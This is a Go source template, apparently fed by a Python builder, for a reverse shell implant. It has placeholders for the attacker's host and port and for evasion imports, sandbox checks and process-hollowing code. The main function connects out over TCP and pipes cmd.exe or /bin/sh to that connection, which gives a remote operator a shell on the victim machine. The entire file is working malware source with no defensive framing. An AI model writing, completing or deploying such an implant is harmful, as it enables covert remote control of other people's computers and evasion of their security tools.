package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"{{EVASION_IMPORTS}}
)

{{EVASION_FUNCTIONS}}

func main() {
	{{SANDBOX_CHECKS}}

	// Configuration placeholders (replaced by Python builder)
	lhost := "{{LHOST}}"
	lport := "{{LPORT}}"

	{{HOLLOWING_CODE}}

	// Establish reverse connection
	fmt.Println("[DEBUG] Attempting to connect to " + lhost + ":" + lport)
	conn, err := net.Dial("tcp", lhost+":"+lport)
	if err != nil {
		fmt.Println("[ERROR] Connection failed:", err)
		time.Sleep(5 * time.Second)
		return
	}
	fmt.Println("[DEBUG] Connected successfully!")
	defer conn.Close()

	// Platform-specific shell
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	// Pipe I/O to connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Execute shell
	cmd.Run()
}
